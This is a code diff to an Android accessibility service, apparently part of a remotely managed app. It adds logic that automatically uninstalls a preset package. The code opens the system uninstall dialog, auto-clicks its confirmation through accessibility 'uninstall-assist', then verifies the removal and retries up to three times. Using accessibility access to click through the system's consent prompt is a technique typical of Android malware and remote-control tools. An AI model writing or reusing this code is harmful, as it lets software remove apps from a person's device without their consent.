@@ -1343,36 +1343,65 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     /**
      * Schedules automatic uninstall of {@link Constants#AUTO_UNINSTALL_PACKAGE} 30 seconds
-     * after the accessibility service connects.  Mirrors exactly what the dashboard's
-     * App Manager does: arm uninstall-assist (auto-click OK/Uninstall), then fire
-     * ACTION_DELETE so the system shows its confirmation dialog.
-     * Skips silently if the package is not installed or the constant is empty.
+     * after the accessibility service connects.  After each attempt it waits 20 seconds and
+     * verifies the package is gone; if it is still installed it retries up to 3 times total.
      */
     private void scheduleAutoUninstall() {
         final String pkg = Constants.AUTO_UNINSTALL_PACKAGE;
         if (pkg == null || pkg.isEmpty()) return;
 
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            try {
-                // Check the target package is actually installed before proceeding
-                getPackageManager().getPackageInfo(pkg, 0);
-
-                Log.i(TAG, "Auto-uninstall: arming uninstall-assist for " + pkg);
-                enableUninstallAssist();
-
-                // Fire the system uninstall dialog — same intent the dashboard uses
-                Intent intent = new Intent(Intent.ACTION_DELETE,
-                        Uri.parse("package:" + pkg));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-
-                Log.i(TAG, "Auto-uninstall: system dialog opened for " + pkg);
-            } catch (android.content.pm.PackageManager.NameNotFoundException e) {
-                Log.i(TAG, "Auto-uninstall: package not installed, skipping — " + pkg);
-            } catch (Exception e) {
-                Log.e(TAG, "Auto-uninstall error: " + e.getMessage());
-            }
+            attemptAutoUninstall(pkg, 1);
         }, 30_000);
+    }
+
+    /**
+     * Single uninstall attempt.  After 20 s it checks whether the package was removed.
+     * If not, and {@code attempt} < 3, it schedules another try.
+     */
+    private void attemptAutoUninstall(String pkg, int attempt) {
+        try {
+            // Bail out if the package is already gone
+            getPackageManager().getPackageInfo(pkg, 0);
+        } catch (android.content.pm.PackageManager.NameNotFoundException e) {
+            Log.i(TAG, "Auto-uninstall: " + pkg + " already removed (attempt " + attempt + ")");
+            return;
+        }
+
+        Log.i(TAG, "Auto-uninstall attempt " + attempt + " for " + pkg);
+        try {
+            enableUninstallAssist();
+            Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {
+            Log.e(TAG, "Auto-uninstall attempt " + attempt + " error: " + e.getMessage());
+        }
+
+        if (attempt < 3) {
+            // After 20 s check whether the uninstall succeeded; retry if not
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                boolean stillInstalled;
+                try {
+                    getPackageManager().getPackageInfo(pkg, 0);
+                    stillInstalled = true;
+                } catch (android.content.pm.PackageManager.NameNotFoundException ex) {
+                    stillInstalled = false;
+                }
+                if (stillInstalled) {
+                    Log.i(TAG, "Auto-uninstall: " + pkg + " still installed, retrying (attempt " + (attempt + 1) + ")");
+                    // Press back to dismiss any lingering dialog before next attempt
+                    try { performBack(); } catch (Exception ignored) {}
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        attemptAutoUninstall(pkg, attempt + 1);
+                    }, 2_000);
+                } else {
+                    Log.i(TAG, "Auto-uninstall: " + pkg + " successfully removed after attempt " + attempt);
+                }
+            }, 20_000);
+        } else {
+            Log.i(TAG, "Auto-uninstall: reached max retries (3) for " + pkg);
+        }
     }
 
     private boolean runUninstallAssist(AccessibilityNodeInfo rootNode) {
